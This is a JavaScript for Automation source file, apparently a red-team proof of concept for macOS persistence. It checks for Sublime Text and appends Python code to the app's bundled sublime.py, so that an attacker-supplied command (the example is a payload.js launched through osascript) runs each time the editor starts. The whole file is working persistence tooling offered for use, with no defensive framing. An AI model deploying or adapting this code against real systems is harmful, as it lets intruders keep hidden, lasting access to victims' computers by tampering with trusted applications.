//Sublime Application Script File
//https://theevilbit.github.io/posts/macos_persisting_through-application_script_files/
//PoC (def a better way to launch from python)

//example usage
//SublimeTextAppScriptPersistence('osascript -l JavaScript /path/to/file/payload.js &')

function SublimeTextAppScriptPersistence (command) {
ObjC.import('Foundation')
ObjC.import('stdlib')
var app = Application.currentApplication();
app.includeStandardAdditions = true;

var output = ""
try{
	function listDirectory(strPath) {
		var fm = $.NSFileManager.defaultManager;
        return ObjC.unwrap(
                fm.contentsOfDirectoryAtPathError($(strPath)
                    .stringByExpandingTildeInPath, null))
            .map(ObjC.unwrap);
    	}
        
	function writeTextToFile(text, file, overwriteExistingContent) {
        var fileString = file.toString()
        var openedFile = app.openForAccess(Path(fileString), { writePermission: true })
        if (overwriteExistingContent) {
            app.setEof(openedFile, { to: 0 })
        }
        app.write(text, { to: openedFile, startingAt: app.getEof(openedFile) })
        app.closeAccess(openedFile)
}
	var sublimePath = '/Applications/Sublime\ Text.app/Contents/MacOS/sublime.py'
	isDir=Ref()
	var sublimeExistsCheck = $.NSFileManager.alloc.init.fileExistsAtPath(sublimePath)
                if (sublimeExistsCheck == false){
					output += "Sublime not installed on target"
				} else {
var commandTemplate = `
import os
os.system(templateCommand)`

	var newCommand = commandTemplate.replace(/templateCommand/g,'"' + command + '"' )
	writeTextToFile(newCommand, sublimePath, false)
	output += "Sublime Application script  at  " + sublimePath + " modified for Persistence"
		}
						
				
}catch(error){
       output += error.toString()
		}
	return output
}
